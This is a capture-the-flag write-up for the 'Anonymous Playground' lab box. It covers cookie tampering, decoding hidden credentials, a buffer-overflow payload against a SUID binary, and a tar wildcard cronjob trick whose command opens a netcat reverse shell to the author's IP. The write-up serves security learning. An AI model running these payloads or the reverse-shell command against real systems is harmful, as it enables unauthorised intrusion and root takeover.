# Anonymous Playground

### Anonymous Playground
Nmap scan shows ports 22 and 80 open. <br />
Enumerating the website, there's a list of operatives: <br />
![image](https://github.com/user-attachments/assets/63e69e30-ff9b-4108-9e33-17de5db045a0)<br />
`/robots.txt` shows the presence of `/zYdHuAKjP`. If I visit it, I get access denied:  <br />
![image](https://github.com/user-attachments/assets/91955c97-2d01-4d8a-a0ab-9906960f9fee)<br />
If I intercept the request with burpsuite, I'm using a Cookie `access=denied`:<br />
![image](https://github.com/user-attachments/assets/ee76fe29-6fe6-4f78-83d7-5c9051f0b702)<br />
My guess is to try and switch it to `access=granted`. It works, I got access:<br />
![image](https://github.com/user-attachments/assets/ce2960d4-08b4-4fa9-97cb-5fd9c0535147)<br />
It has the structure of a set of credentials. Also, I can see that many characters of this string often repeat. For example the username `hEzAdCfHzA`. I can see that the pattern `zA` is repeated 2 times, in position 2 and 5. If I look at the list of operatives, I get that only one of them has this pattern, and it is `magna`. <br />
If it's correct, I know the following patterns: 

    hE = m
    zA = a
    dC = g
    fH = n
So If I try to reconstruct the full string, I get: `magna::magna{hAiJ}a{eIaDjBcBhHgA}an{fN}`. This is starting to look more like a set of credentials. I need to find a way to decode the other characters.. <br />
After about 1 hour of trial and error, I finally understood the decoding algorithm. If we consider for each letter its corresponding number in the alphabet, then we just need to sum the two numbers.<br />
For example if `z=26`(it's the last letter of the alphabet) and `A=1`(it's the first letter of the alphabet), if we sum them we get `27`, which is equal to `1 mod 26`. So I believe that the decoding algorithm is simply `a+b mod 26`.
Considering the following index table: <br />
![image](https://github.com/user-attachments/assets/fa86d920-ae87-4329-824e-07c6a8f10963)<br />
If I apply this decoding algorithm to all the unknown characters of the string `magna::magna{hAiJ}a{eIaDjBcBhHgA}an{fN}`, I get the following results: 

    hA = 8 + 1 = 9 --> i
    iJ = 9 + 10 = 19 --> s
    eI = 5 + 9 = 14 --> n
    aD = 1 + 4 = 5 --> e
    jB = 10 + 2 = 12 --> l
    cB = 3 + 2 = 5 --> e
    hH = 8 + 8 = 16 --> p
    gA = 7 + 1 = 8 --> h
    fN = 6 + 14 = 20 --> t
According to this decoding system, the final string should be `magna:magnaisanelephant`. I try these credentials to access ssh and it works! I got the user flag.<br />
I now need to do some lateral movement. Inside magna's home directory there's a SUID file and a note: <br />
![image](https://github.com/user-attachments/assets/cd01c0be-e2b9-4e82-b681-23a0aa26e50a)<br />
Also, if I check the cronjobs, I get: <br />
![image](https://github.com/user-attachments/assets/e23a9977-82a5-46fc-ace3-f39124a301d8)<br />
To exploit this cronjob I need write permissions inside `spooky`'s home directory, which I don't have. So I first need to become spooky, probably by exploiting that SUID binary. <br />
If I try to dissassemble it, I see that there's a function called `call_bash`. But it is never called inside the main. This function executes `system(/bin/sh)` with the privileges of spooky. Also, the main function calls `gets()`, which is vulnerable to buffer overflow. So I need to overflow the buffer with the address of `call_bash`. I check what is the address of the `call_bash` function:<br />
![image](https://github.com/user-attachments/assets/4dc93c61-34ee-43f0-9b30-748d834e345b)<br />
And it is at `0x400657`. So my final payload is `python -c "print('A' * 72 + '\x57\x06\x40\x00\x00\x00\x00\x00')" | ./hacktheworld`:<br />
![image](https://github.com/user-attachments/assets/b57bacec-72db-48ca-bf8b-509fa6b750fd)<br />
The `call_bash` function gets executed. But the problem here is that the shell exits immediately after. The right paylaod to get an working interactive shell is `(python -c "print('A' * 72 + '\xbf\x06\x40\x00\x00\x00\x00\x00')";cat) | ./hacktheworld`. Here I changed two thigs:
- First of all I inserted a `cat` at the end of the command, that is because `cat` takes input from stdin and writes on stdout. This makes sure that the shell will use the same pipe of `cat`, and will be interactive.
- I also changed the target address to `\xbf\x06\x40\x00\x00\x00\x00\x00`. That is something I decided to do after some trial and error, and it's the target address used to spawn the shell. I honestly don't understand why it didn't work with the exact address of `call_bash`. My guess is that since there are other `call` instructions inside `call_bash`, they might fuck up the stack or somehting.. I don't know to be honest. But that payload works and I'm fine with it. <br />
So now I can finally exploit that cronjob.
<br />
To exploit it I'll use tar wildcards. Just run the two following commands:

        echo "" > '--checkpoint=1'
        echo "" > '--checkpoint-action=exec=busybox nc 10.11.127.156 9001 -e sh'
Of course change the IP address and port according to your needs. Then listen with netcat and wait for the root reverse shell!<br />
![image](https://github.com/user-attachments/assets/9236eda1-fe9d-4782-9e6b-eb5f2daf76cc)<br />



